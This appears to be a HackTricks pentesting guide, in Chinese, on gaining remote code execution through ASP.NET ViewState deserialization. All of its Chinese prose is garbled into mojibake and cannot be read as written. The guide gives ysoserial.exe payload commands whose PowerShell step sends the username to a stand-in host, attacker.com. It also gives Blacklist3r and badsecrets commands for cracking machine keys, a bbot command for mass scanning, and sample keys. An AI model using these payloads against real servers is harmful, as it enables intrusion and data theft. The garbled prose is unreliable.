# åˆ©ç”¨ \_\_VIEWSTATE å‚æ•°è€Œä¸çŸ¥é“å¯†é’¥çš„æ–¹æ³•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„ **å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ **HackTricks** å’Œ **HackTricks Cloud** çš„ github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœæ‚¨å¯¹ **é»‘å®¢èŒä¸š** æ„Ÿå…´è¶£å¹¶æƒ³è¦é»‘æ‰æ— æ³•é»‘æ‰çš„ä¸œè¥¿ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦é¢å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

## ViewState æ˜¯ä»€ä¹ˆ

**ViewState** åœ¨ ASP.NET ä¸­ä½œä¸ºé»˜è®¤æœºåˆ¶ï¼Œç”¨äºåœ¨ç½‘é¡µä¹‹é—´ä¿æŒé¡µé¢å’Œæ§ä»¶æ•°æ®ã€‚åœ¨æ¸²æŸ“é¡µé¢çš„ HTML æ—¶ï¼Œé¡µé¢çš„å½“å‰çŠ¶æ€å’Œåœ¨ postback æœŸé—´éœ€è¦ä¿ç•™çš„å€¼è¢«åºåˆ—åŒ–ä¸º base64 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚ç„¶åå°†è¿™äº›å­—ç¬¦ä¸²æ”¾å…¥éšè—çš„ ViewState å­—æ®µä¸­ã€‚

ViewState ä¿¡æ¯å¯ä»¥é€šè¿‡ä»¥ä¸‹å±æ€§æˆ–å®ƒä»¬çš„ç»„åˆæ¥æè¿°ï¼š

- **Base64**:
- å½“ `EnableViewStateMac` å’Œ `ViewStateEncryptionMode` å±æ€§éƒ½è®¾ç½®ä¸º false æ—¶ä½¿ç”¨æ­¤æ ¼å¼ã€‚

- **Base64 + å¯ç”¨ MACï¼ˆæ¶ˆæ¯è®¤è¯ç ï¼‰**:
- é€šè¿‡å°† `EnableViewStateMac` å±æ€§è®¾ç½®ä¸º true æ¥æ¿€æ´» MACã€‚è¿™ä¸º ViewState æ•°æ®æä¾›äº†å®Œæ•´æ€§éªŒè¯ã€‚

- **Base64 + åŠ å¯†**:
- å½“ `ViewStateEncryptionMode` å±æ€§è®¾ç½®ä¸º true æ—¶åº”ç”¨åŠ å¯†ï¼Œç¡®ä¿ ViewState æ•°æ®çš„æœºå¯†æ€§ã€‚

## æµ‹è¯•æ¡ˆä¾‹

è¯¥å›¾è¡¨è¯¦ç»†è¯´æ˜äº†åŸºäº .NET æ¡†æ¶ç‰ˆæœ¬çš„ ASP.NET ä¸­ ViewState çš„ä¸åŒé…ç½®ã€‚ä»¥ä¸‹æ˜¯å†…å®¹æ‘˜è¦ï¼š

1. å¯¹äº **ä»»ä½•ç‰ˆæœ¬çš„ .NET**ï¼Œå½“ MAC å’ŒåŠ å¯†éƒ½è¢«ç¦ç”¨æ—¶ï¼Œä¸éœ€è¦ MachineKeyï¼Œå› æ­¤æ²¡æœ‰é€‚ç”¨çš„æ–¹æ³•æ¥è¯†åˆ«å®ƒã€‚

2. å¯¹äº **4.5 ç‰ˆæœ¬ä»¥ä¸‹çš„ç‰ˆæœ¬**ï¼Œå¦‚æœå¯ç”¨äº† MAC ä½†æœªå¯ç”¨åŠ å¯†ï¼Œåˆ™éœ€è¦ MachineKeyã€‚ç”¨äºè¯†åˆ« MachineKey çš„æ–¹æ³•ç§°ä¸º "Blacklist3r"ã€‚

3. å¯¹äº **4.5 ç‰ˆæœ¬ä»¥ä¸‹çš„ç‰ˆæœ¬**ï¼Œæ— è®º MAC æ˜¯å¦å¯ç”¨ï¼Œå¦‚æœå¯ç”¨äº†åŠ å¯†ï¼Œåˆ™éœ€è¦ MachineKeyã€‚è¯†åˆ« MachineKey æ˜¯ "Blacklist3r - æœªæ¥å‘å±•" çš„ä»»åŠ¡ã€‚

4. å¯¹äº **4.5 åŠä»¥ä¸Šç‰ˆæœ¬**ï¼ŒMAC å’ŒåŠ å¯†çš„æ‰€æœ‰ç»„åˆï¼ˆæ— è®ºä¸¤è€…æ˜¯å¦ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªä¸º true å¦ä¸€ä¸ªä¸º falseï¼‰éƒ½éœ€è¦ MachineKeyã€‚å¯ä»¥ä½¿ç”¨ "Blacklist3r" æ¥è¯†åˆ« MachineKeyã€‚


### æµ‹è¯•æ¡ˆä¾‹ï¼š1 â€“ EnableViewStateMac=false å’Œ viewStateEncryptionMode=false

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ä»¥ä¸‹ä½ç½®å°† `AspNetEnforceViewStateMac` æ³¨å†Œè¡¨é”®è®¾ç½®ä¸ºé›¶æ¥å®Œå…¨ç¦ç”¨ ViewStateMACã€‚
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**è¯†åˆ«ViewStateå±æ€§**

æ‚¨å¯ä»¥å°è¯•é€šè¿‡ä½¿ç”¨BurpSuiteæ•è·åŒ…å«æ­¤å‚æ•°çš„è¯·æ±‚æ¥è¯†åˆ«æ˜¯å¦ä½¿ç”¨MACä¿æŠ¤äº†ViewStateã€‚å¦‚æœæœªä½¿ç”¨Macæ¥ä¿æŠ¤å‚æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨[YSoSerial.Net](https://github.com/pwntester/ysoserial.net)æ¥åˆ©ç”¨å®ƒã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### æµ‹è¯•æ¡ˆä¾‹ 1.5 â€“ ç±»ä¼¼äºæµ‹è¯•æ¡ˆä¾‹ 1ï¼Œä½†æœåŠ¡å™¨æœªå‘é€ ViewState cookie

å¼€å‘äººå‘˜å¯ä»¥**ç§»é™¤ ViewState**ï¼Œä½¿å…¶ä¸æˆä¸º HTTP è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼ˆç”¨æˆ·å°†ä¸ä¼šæ”¶åˆ°æ­¤ cookieï¼‰ã€‚\
æœ‰äººå¯èƒ½ä¼šè®¤ä¸ºï¼Œå¦‚æœ**ViewState**ä¸å­˜åœ¨ï¼Œä»–ä»¬çš„å®ç°å°±ä¸ä¼šå—åˆ° ViewState ååºåˆ—åŒ–å¯èƒ½å¸¦æ¥çš„ä»»ä½•æ½œåœ¨æ¼æ´çš„å½±å“ã€‚\
ç„¶è€Œï¼Œäº‹å®å¹¶éå¦‚æ­¤ã€‚å¦‚æœæˆ‘ä»¬**å‘è¯·æ±‚ä½“æ·»åŠ  ViewState å‚æ•°**å¹¶å‘é€ä½¿ç”¨ ysoserial åˆ›å»ºçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥å®ç°**ä»£ç æ‰§è¡Œ**ï¼Œå°±åƒ**æ¡ˆä¾‹ 1**ä¸­æ‰€ç¤ºã€‚


### æµ‹è¯•æ¡ˆä¾‹: 2 â€“ .Net < 4.5 ä¸” EnableViewStateMac=true & ViewStateEncryptionMode=false

ä¸ºäº†ä¸º**ç‰¹å®šé¡µé¢å¯ç”¨ ViewState MAC**ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç‰¹å®šçš„ aspx æ–‡ä»¶è¿›è¡Œä»¥ä¸‹æ›´æ”¹ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åœ¨**web.config**æ–‡ä»¶ä¸­è¿›è¡Œå¦‚ä¸‹è®¾ç½®æ¥é’ˆå¯¹**æ•´ä¸ª**åº”ç”¨ç¨‹åºæ‰§è¡Œæ­¤æ“ä½œï¼š
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ç”±äºå‚æ•°å—MACä¿æŠ¤ï¼Œä¸ºäº†æˆåŠŸæ‰§è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ä½¿ç”¨çš„å¯†é’¥ã€‚

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) æ¥æŸ¥æ‰¾ä½¿ç”¨çš„å¯†é’¥ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) æ˜¯å¦ä¸€ä¸ªå¯ä»¥è¯†åˆ«å·²çŸ¥ machineKeys çš„å·¥å…·ã€‚å®ƒæ˜¯ç”¨ Python ç¼–å†™çš„ï¼Œå› æ­¤ä¸ Blacklist3r ä¸åŒï¼Œå®ƒæ²¡æœ‰ Windows ä¾èµ–æ€§ã€‚å¯¹äº .NET viewstatesï¼Œæœ‰ä¸€ä¸ªåä¸º "python blacklist3r" çš„å®ç”¨ç¨‹åºï¼Œè¿™æ˜¯ä½¿ç”¨å®ƒçš„æœ€å¿«æ–¹å¼ã€‚

å®ƒå¯ä»¥ç›´æ¥æä¾› viewstate å’Œç”Ÿæˆå™¨ï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

æˆ–è€…ï¼Œå®ƒå¯ä»¥ç›´æ¥è¿æ¥åˆ°ç›®æ ‡URLï¼Œå¹¶å°è¯•ä»HTMLä¸­æå–viewstateï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

è¦åœ¨è§„æ¨¡ä¸Šæœç´¢æ˜“å—æ”»å‡»çš„viewstatesï¼Œå¯ä»¥ç»“åˆå­åŸŸæšä¸¾ï¼Œä½¿ç”¨`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) æ¨¡å—ï¼š
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

å¦‚æœä½ å¾ˆå¹¸è¿æ‰¾åˆ°äº†å¯†é’¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
åœ¨æœåŠ¡å™¨**æœªå‘é€**`_VIEWSTATEGENERATOR`å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‚¨**æ— éœ€**æä¾›`--generator`å‚æ•°**ä½†è¿™äº›å‚æ•°**ï¼š
```bash
--apppath="/" --path="/hello.aspx"
```
### æµ‹è¯•æ¡ˆä¾‹ï¼š3 â€“ .Net < 4.5 å’Œ EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸æ¸…æ¥šå‚æ•°æ˜¯å¦å—åˆ° MAC ä¿æŠ¤ã€‚å› æ­¤ï¼Œè¯¥å€¼å¯èƒ½å·²åŠ å¯†ï¼Œæ‚¨å°†**éœ€è¦æœºå™¨å¯†é’¥æ¥åŠ å¯†æ‚¨çš„æœ‰æ•ˆè´Ÿè½½**ä»¥åˆ©ç”¨æ¼æ´ã€‚

**åœ¨è¿™ç§æƒ…å†µä¸‹**ï¼Œ[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **æ¨¡å—æ­£åœ¨å¼€å‘ä¸­...**

**åœ¨.NET 4.5ä¹‹å‰**ï¼Œå³ä½¿**`ViewStateEncryptionMode`**å·²è®¾ç½®ä¸º_**Always**_ï¼ŒASP.NETä¹Ÿå¯ä»¥ä»ç”¨æˆ·é‚£é‡Œ**æ¥å—**ä¸€ä¸ª**æœªåŠ å¯†çš„**\_`__VIEWSTATE`\_å‚æ•°ã€‚ASP.NET**ä»…æ£€æŸ¥**è¯·æ±‚ä¸­**`__VIEWSTATEENCRYPTED`**å‚æ•°çš„**å­˜åœ¨**ã€‚**å¦‚æœåˆ é™¤æ­¤å‚æ•°å¹¶å‘é€æœªåŠ å¯†çš„æœ‰æ•ˆè´Ÿè½½ï¼Œåˆ™ä»å°†è¢«å¤„ç†ã€‚**

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…æ‰¾åˆ°å¦ä¸€ä¸ªæ¼æ´ï¼ˆå¦‚æ–‡ä»¶éå†ï¼‰æ¥è·å–æœºå™¨å¯†é’¥ï¼Œ[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) å‘½ä»¤åœ¨**æ¡ˆä¾‹2**ä¸­ä½¿ç”¨ï¼Œå¯ç”¨äºåˆ©ç”¨ ViewState ååºåˆ—åŒ–æ¼æ´æ‰§è¡Œ RCEã€‚

* ä»è¯·æ±‚ä¸­åˆ é™¤`__VIEWSTATEENCRYPTED`å‚æ•°ä»¥åˆ©ç”¨ ViewState ååºåˆ—åŒ–æ¼æ´ï¼Œå¦åˆ™å°†è¿”å› Viewstate MAC éªŒè¯é”™è¯¯ï¼Œåˆ©ç”¨å°†å¤±è´¥ã€‚

### æµ‹è¯•æ¡ˆä¾‹ï¼š4 â€“ .Net >= 4.5 å’Œ EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true/false é™¤éä¸¤ä¸ªå±æ€§å‡è®¾ç½®ä¸º false

æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ web.config æ–‡ä»¶ä¸­æŒ‡å®šä»¥ä¸‹å‚æ•°æ¥å¼ºåˆ¶ä½¿ç”¨ ASP.NET æ¡†æ¶ã€‚
```xml
<httpRuntime targetFramework="4.5" />
```
æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡åœ¨web.configæ–‡ä»¶çš„`machineKey`å‚æ•°ä¸­æŒ‡å®šä»¥ä¸‹é€‰é¡¹æ¥å®Œæˆã€‚
```bash
compatibilityMode="Framework45"
```
ä¸ä¹‹å‰ä¸€æ ·ï¼Œæ•°å€¼æ˜¯åŠ å¯†çš„ã€‚ç„¶åï¼Œä¸ºäº†å‘é€æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼Œæ”»å‡»è€…éœ€è¦å¯†é’¥ã€‚

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æŸ¥æ‰¾æ­£åœ¨ä½¿ç”¨çš„å¯†é’¥ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
è¯·å‚è€ƒ[IISDirPathå’ŒTargetPagePathçš„æ›´è¯¦ç»†æè¿°](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

æˆ–è€…ï¼Œä½¿ç”¨[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆå¸¦æœ‰ç”Ÿæˆå™¨å€¼ï¼‰:
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ä¸€æ—¦ç¡®å®šäº†æœ‰æ•ˆçš„Machine keyï¼Œ**ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ç”Ÿæˆåºåˆ—åŒ–çš„æœ‰æ•ˆè½½è·**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
å¦‚æœæ‚¨æ‹¥æœ‰`__VIEWSTATEGENERATOR`çš„å€¼ï¼Œå¯ä»¥å°è¯•**ä½¿ç”¨**è¯¥å€¼ä¸`--generator`å‚æ•°ï¼Œå¹¶**çœç•¥**`--path`å’Œ`--apppath`å‚æ•°ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

æˆåŠŸåˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´å°†å¯¼è‡´å‘å—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨å‘å‡ºå¸¦æœ‰ç”¨æˆ·åçš„å¸¦å¤–è¯·æ±‚ã€‚è¿™ç§åˆ©ç”¨æ¼æ´çš„ç¤ºä¾‹å·²åœ¨ä¸€ä¸ªåä¸ºâ€œExploiting ViewState Deserialization using Blacklist3r and YsoSerial.NETâ€çš„èµ„æºä¸­å±•ç¤ºã€‚è¦äº†è§£åˆ©ç”¨è¿‡ç¨‹çš„è¯¦ç»†ä¿¡æ¯ä»¥åŠå¦‚ä½•ä½¿ç”¨Blacklist3rç­‰å·¥å…·æ¥è¯†åˆ«MachineKeyï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æä¾›çš„[æˆåŠŸåˆ©ç”¨çš„PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ã€‚

### æµ‹è¯•æ¡ˆä¾‹6 â€“ æ­£åœ¨ä½¿ç”¨ViewStateUserKeys

**ViewStateUserKey**å±æ€§å¯ç”¨äº**é˜²å¾¡****CSRFæ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­å·²å®šä¹‰äº†è¿™æ ·ä¸€ä¸ªå¯†é’¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å°è¯•ä½¿ç”¨åˆ°ç›®å‰ä¸ºæ­¢è®¨è®ºçš„æ–¹æ³•ç”Ÿæˆ**ViewState**è½½è·ï¼Œåˆ™**åº”ç”¨ç¨‹åºä¸ä¼šå¤„ç†è¯¥è½½è·**ã€‚\
æ‚¨éœ€è¦ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„å‚æ•°æ¥æ­£ç¡®åˆ›å»ºè½½è·ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸåˆ©ç”¨çš„ç»“æœ <a href="#poc" id="poc"></a>

å¯¹äºæ‰€æœ‰æµ‹è¯•æ¡ˆä¾‹ï¼Œå¦‚æœ ViewState YSoSerial.Net è´Ÿè½½æˆåŠŸè¿è¡Œï¼Œåˆ™æœåŠ¡å™¨å°†ä»¥â€œ**500 å†…éƒ¨æœåŠ¡å™¨é”™è¯¯**â€çš„å½¢å¼å“åº”ï¼Œå“åº”å†…å®¹ä¸ºâ€œ**æ­¤é¡µé¢çš„çŠ¶æ€ä¿¡æ¯æ— æ•ˆï¼Œå¯èƒ½å·²æŸå**â€ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¼šæ”¶åˆ° OOB è¯·æ±‚ã€‚

æŸ¥çœ‹[æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»è¿™é‡Œ]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))

## å‚è€ƒèµ„æ–™

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœæ‚¨å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦é¢å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ä¸Š **å…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
